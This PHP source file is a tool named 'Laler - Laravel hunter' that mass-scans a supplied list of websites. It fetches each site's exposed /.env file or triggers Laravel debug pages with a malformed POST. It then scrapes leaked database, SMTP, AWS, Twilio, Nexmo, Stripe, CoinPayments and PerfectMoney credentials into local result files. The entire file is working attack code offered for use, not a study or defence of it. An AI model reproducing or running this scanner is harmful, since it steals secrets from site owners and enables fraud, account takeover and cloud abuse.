<?php
namespace App\Services;

/**
 *  Laler - Laravel hunter.
 * 
 * @author shutdown57
 * @version 1.0
 * 
 */
Class Laler{

    private $filelist;
    private $result_dir;
    private $aws_region;
    private $curl_response;
    private $method;
    public function __construct()
    {
       
        $this->result_dir = 'laler_result';
        if(!is_dir($this->result_dir))
        {
            @mkdir($this->result_dir);
            @chmod($this->result_dir,0777);
            @mkdir($this->result_dir.'/weblogs');
            @chmod($this->result_dir.'/weblogs', 0777);
            @mkdir($this->result_dir.'/checker');
            @chmod($this->result_dir.'/checker', 0777);
        }
        $this->aws_region = ['us-east-1','us-east-2','us-west-1','us-west-2','af-south-1','ap-east-1','ap-south-1','ap-northeast-1','ap-northeast-2','ap-northeast-3','ap-southeast-1','ap-southeast-2','ca-central-1','eu-central-1','eu-west-1','eu-west-2','eu-west-3','eu-south-1','eu-north-1','me-south-1','sa-east-1'];
    }
    public function build_result($data = [] , $filename)
    {
        $fp = fopen($this->result_dir.'/'.$filename , 'a+');
        $fp1 = fopen($this->result_dir.'/checker/'.$filename, 'a+');
        $content="\n ------------------------------------ \n";
        $ceker = "";
        $count = count($data)-1;
        $n=0;
        foreach($data as $key=>$val)
        {
            $content.="$key :: $val \n";
            $ceker.=str_replace(["\n","\r"," "],"",$val);
            if($n++ >= $count)
            {
                $ceker.="\n";
            }else{
                $ceker.="|";
            }
        }
        $content.="\n ------------------------------------ \n";

        fwrite($fp,$content);
        fclose($fp);

        fwrite($fp1,$ceker);
        fclose($fp1);
    }
    public function banner()
    {
        print "
         _          _             
        | |    __ _| | ___ _ __   
        | |   / _` | |/ _ \ '__| + + 
        | |__| (_| | |  __/ |  + shutdown57 +
        |_____\__,_|_|\___|_|  + Laravel Hunter +

        =+ @version : 1.0         
        ";
    }
    public function color($color, $text)
    {
            $arrayColor = array(
                'grey' => '1;30',
                'red' => '1;31',
                'green' => '1;32',
                'yellow' => '1;33',
                'blue' => '1;34',
                'purple' => '1;35',
                'nevy' => '1;36',
                'white' => '1;1',
                'bgred' => '1;41',
                'bggreen' => '1;42',
                'bgyellow' => '1;43',
                'bgblue' => '1;44',
                'bgpurple' => '1;45',
                'bgnavy' => '1;46',
                'bgwhite' => '1;47'
            );
            if(substr(PHP_OS,0,3) == 'Lin')
            {
                return "\033[".$arrayColor[$color]."m  ".$text." \033[0m";
            }else{

                return $text;
            }
    }
    public function exploit_debug($url)
    {
        $url = str_replace(['http://' , 'https://'] , '',$url);
        $target_url = 'http://'.$url;
        $c = curl_init();
        $arr = [
            CURLOPT_URL=>$target_url,
            CURLOPT_RETURNTRANSFER=>true,
            CURLOPT_USERAGENT=>'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
            CURLOPT_TIMEOUT=>9,
            CURLOPT_SSL_VERIFYPEER=>false,
            CURLOPT_FOLLOWLOCATION=>false,
            CURLOPT_POST=>true,
            CURLOPT_POSTFIELDS=> json_encode(['0x[]','./shutdown57'])
        ];
        curl_setopt_array($c,$arr);
        $x = curl_exec($c);
        return $x;
    }
  
    public function multithreadCurl($url = [] )
    {
        $ch = array();
        $mh = curl_multi_init();
        $total = count($url);
    

        for($i=0;$i<$total;$i++)
        {
           
                $domain = str_replace(['http://','https://'],'',$url[$i]);
                $target_url = 'http://'.$domain.'/.env';
          

            $ch[$i] = curl_init();
            curl_setopt($ch[$i],CURLOPT_URL,$target_url);
            curl_setopt($ch[$i],CURLOPT_RETURNTRANSFER,true);
          
            curl_setopt($ch[$i],CURLOPT_USERAGENT,'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36');
            curl_setopt($ch[$i],CURLOPT_TIMEOUT,10);
            curl_setopt($ch[$i],CURLOPT_SSL_VERIFYPEER,false);
            curl_setopt($ch[$i],CURLOPT_FOLLOWLOCATION,false);
            curl_setopt($ch[$i], CURLOPT_VERBOSE, false);
            curl_setopt($ch[$i], CURLOPT_SSL_VERIFYHOST, false); 

            curl_multi_add_handle($mh,$ch[$i]);
        }
        $active = null;

        do{
            $mrc = curl_multi_exec($mh, $active);
            $id=1;
            while($info = curl_multi_info_read($mh))
            {
               
                $result         = curl_multi_getcontent($info['handle']);
                $infos 			= curl_getinfo($info['handle']);
                $result_data    = "";
                $domain = str_replace(['http://','https://','/.env'],'',$infos['url']);
                
                /** check vuln */
                if(preg_match("/APP_KEY/",$result)){
                    $result_data = $result;
                    $status = ['msg' => 'VULN','METHOD' => 'ENV','code' => 1];
                }else{
                    $result = $this->exploit_debug($domain);
                    if(preg_match("/APP_KEY/",$result)){
                        $result_data = $result;
                        $status = ['msg' => 'VULN','METHOD' => 'DEBUG','code' => 1];
                    }else{
                        $result_data = $result;
                        $status = ['msg' => 'NOT VULNERABLE','METHOD' => 'ENV','code' => 0];
                    }
                }


                $this->curl_response[] = ['process_id' => $id++,
                                'url' => 'http://'.$domain ,
                                'http_code' => $infos['http_code'],
                                'status' => $status,
                               'result' => $result_data
                                ];
                curl_multi_remove_handle($mh, $info['handle']);

            }
            usleep(100);
        }while($active);
        curl_multi_close($mh);

        return $this->curl_response;
    }
  
    public function ereksi($data = [] , $source,$util)
    {
        $x['WEB_TARGET'] = $util['web'];
        $x['EXPLOIT_METHOD'] = $util['method'];
        foreach($data as $d)
        {
            if(preg_match("/AWS|SES_KEY|AWS_KEY/",$d))
            {
                $x['AWS_REGION'] = $this->aws_region($source);
            }
            if(preg_match("#<td>{$d}</td>#",$source)){
            preg_match("#<td>".$d."<\/td>\s+<td><pre.*>(.*?)<\/span>#",$source,$match);
            $x[$d] = @$match[1];
            }elseif(preg_match("#{$d}=#",$source))
            {
                preg_match("#\n{$d}=(.*?)\n#",$source,$match);
                $x[$d] =@$match[1];
            }else{
                return false;
            }
        }
        
        $this->build_result($x,$util['save_as']);
        return $x;
    }
    public function get_database($source,$method,$web)
    {
        $data = ['DB_HOST','DB_PORT','DB_DATABASE','DB_USERNAME','DB_PASSWORD'];
        $util = ['web' => $web,'method' => $method , 'save_as' => 'database.txt'];

        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen',' DB ');
        }else{
            return $this->color('bgred',' DB ');
        }

        
    }
    public function get_smtp($source,$method,$web)
    {
        $data =['MAIL_HOST','MAIL_PORT','MAIL_USERNAME','MAIL_PASSWORD','MAIL_FROM_ADDRESS','MAIL_FROM_NAME'];
        $util = ['web' => $web,'method' => $method , 'save_as' => 'smtp.txt'];

        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen',' SMTP ');
        }else{
            return $this->color('bgred',' SMTP ');
        }
    }
    public function aws_region($source)
    {
        foreach($this->aws_region as $reg)
        {
            if(preg_match("/$reg/",$source,$match))
            {
                return $match[0];
            }
        }
        return 'unknown-region';
    }
    public function get_aws($source,$method,$web)
    {
        $data = ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY'];
        $data2 = ['AWS_KEY','AWS_SECRET','AWS_BUCKET'];
        $data3 = ['AWS_SNS_KEY','AWS_SNS_SECRET','SMS_FROM','SMS_DRIVER'];
        $data4 = ['AWS_S3_KEY', 'AWS_S3_SECRET'];
        $data5 = ['AWS_SES_KEY','AWS_SES_SECRET'];
        $data6 =  ['SES_KEY','SES_SECRET'];
        $data7 = ['AWS_ACCESS_KEY_ID_2','AWS_ACCESS_SECRET_ID_2'];
        $data8 = ['WAS_ACCESS_KEY_ID','WAS_SECRET_ACCESS_KEY'];
        $data9 = ['S3_KEY','S3_SECRET'];

        $util = ['web' => $web,'method' => $method , 'save_as' => 'aws.txt'];

        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen',' AWS ');
        }elseif($this->ereksi($data2,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }elseif($this->ereksi($data3,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }elseif($this->ereksi($data4,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }elseif($this->ereksi($data5,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }elseif($this->ereksi($data6,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }elseif($this->ereksi($data7,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }elseif($this->ereksi($data8,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }elseif($this->ereksi($data9,$source,$util) !== false)
        {
            return $this->color('bgblue',' AWS ');
        }
        else{
            return $this->color('bgred',' AWS ');
        }
    }
    public function get_twilio($source,$method,$web)
    {
        $data = ['TWILIO_SID','TWILIO_TOKEN','TWILIO_NUMBER'];
        $data2 = ['TWILIO_ACCOUNT_SID','TWILIO_API_KEY','TWILIO_API_SECRET','TWILIO_NUMBER','TWILIO_AUTH_TOKEN','TWILIO_CHAT_SERVICE_SID'];
        $util = ['web' => $web,'method' => $method , 'save_as' => 'twilio.txt'];
        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen',' TWILIO ');
        }elseif($this->ereksi($data2,$source,$util) !== false)
        {
            return $this->color('bgblue', ' TWILIO ');
        }
        else{
            return $this->color('bgred',' TWILIO ');
        }

    }
    public function get_nexmo($source,$method,$web)
    {
        $data = ['NEXMO_KEY','NEXMO_SECRET','NEXMO_NUMBER'];
        $util = ['web' => $web,'method' => $method , 'save_as' => 'nexmo.txt'];
        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen',' NEXMO ');
        }else{
            return $this->color('bgred',' NEXMO ');
        }
    }
    public function get_exotel($source,$method,$web)
    {
        $data = ['EXOTEL_API_KEY','EXOTEL_API_TOKEN','EXOTEL_API_SID'];
        $util = ['web' => $web,'method' => $method , 'save_as' => 'exotel.txt'];
        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen',' EXOTEL ');
        }else{
            return $this->color('bgred',' EXOTEL ');
        }
    }
    public function get_coinpayment($source,$method,$web)
    {
        $data = ['CP_PUBLIC_KEY','CP_PRIVATE_KEY'];
        $data2 = ['COINPAYMENT_PUBLIC_KEY','COINPAYMENT_PRIVATE_KEY'];
        $data3 = ['COINPAYMENTS_PUBLIC_KEY','COINPAYMENTS_PRIVATE_KEY'];

        $util = ['web' => $web,'method' => $method , 'save_as' => 'coinpayments.txt'];
        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen',' CP ');
        }elseif($this->ereksi($data2,$source,$util) !== false)
        {
            return $this->color('bgblue', ' CP ');
        }elseif($this->ereksi($data3,$source,$util) !== false)
        {
            return $this->color('bgblue', ' CP ');
        }else{
            return $this->color('bgred', ' CP ');

        }
    }
    public function get_perfectmoney($source,$method,$web)
    {
        $data = ['PM_MEMBER_ID','PM_PASSWORD','PAYEE_ACCOUNT','ALTERNATE_PHRASE_HASH'];
        $util = ['web' => $web,'method' => $method , 'save_as' => 'pefectmoney.txt'];

        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen', ' PM ');
        }else{
            return $this->color('bgred', ' PM ');
        }
    }
    public function get_stripe($source,$method,$web)
    {
        $data = ['STRIPE_KEY','STRIPE_SECRET'];
        $util = ['web' => $web,'method' => $method , 'save_as' => 'stripe.txt'];
        if($this->ereksi($data,$source,$util) !== false)
        {
            return $this->color('bggreen', ' STRIPE ');
        }else{
            return $this->color('bgred', ' STRIPE ');
        }

    }
    public function juooshh($source,$method,$web)
    {
        $getall = get_class_methods($this);
        foreach($getall as $metot)
        {
            if(strpos($metot , 'get_') === false)continue;

            echo $this->$metot($source,$method,$web);
        }
    }

    public function run()
    {

        $this->banner();
        echo "\n\n\n";
        $this->filelist = readline("  @WEBLIST >>");
        $threads        = readline("  @THREAD  >>");

        $lists = preg_split('/\r\n|\r|\n/', file_get_contents($this->filelist));
        echo "\n\n";
        echo $this->color('blue', 'LIST COUNT => '.count($lists));
        usleep(200);
        echo "\n";
        echo $this->color('blue','CHECKING ' .$threads.' SITES PER-REQUEST ');
        echo "\n\n\n";
        $no=1;
        
        $chunk = array_chunk($lists , $threads);
        $n=1;
        foreach($chunk as $urls)
        {
            echo $this->color('yellow', '# RUNNING THREAD '.$n++);
            echo "\n";
            $exec = $this->multithreadCurl($urls);
            foreach($exec as $data)
            {
                $key = $data['result'];
                $url = $data['url'];
                $domain = str_replace(["http://","https://"],"",$url);

                if($data['status']['code'] == 0){
                    echo $this->color('yellow','#');
                    echo $this->color('red',implode(" | ",[$url,' NOT VULNERABLE ']));   echo "\n";
                }elseif($data['status']['code'] == 1)
                {
                    echo $this->color('yellow','#');
                    echo $this->color('green',implode(" | ",[$url,$data['status']['METHOD']]));
                     $this->juooshh($key,$data['status']['METHOD'],$url);   echo "\n";
                }
            }



      

            
      
        }
    }
}

